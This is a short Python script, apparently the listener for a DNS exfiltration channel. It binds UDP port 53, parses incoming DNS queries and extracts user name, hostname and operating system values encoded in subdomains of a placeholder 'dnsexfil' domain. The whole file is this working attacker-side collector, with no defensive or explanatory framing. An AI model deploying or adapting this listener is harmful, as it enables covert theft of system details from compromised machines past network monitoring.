import socket
import re
import binascii
from dnslib import DNSRecord

UDP_IP = "0.0.0.0"
UDP_PORT = 53

print("Starting Listener:")
sock = socket.socket(socket.AF_INET, # Internet
           socket.SOCK_DGRAM) # UDP
sock.bind((UDP_IP, UDP_PORT))

while True:
 byteData, addr = sock.recvfrom(2048) # buffer size is 2048 bytes
 try:
   msg = binascii.unhexlify(binascii.b2a_hex(byteData))
   msg = DNSRecord.parse(msg)
 except Exception as e:
   print(e)
   continue
 m = re.search(r'\;(\S+)\.dnsexfil\.YourDomainHere\.com', str(msg), re.MULTILINE)
 if m:
   x = m.group(1).split('.')
   if len(x) == 3:
      user = x[0]
      hostname = x[1]
      osV = x[2]
      print("User:",user,"Hostname:",hostname,"OS:",osV)
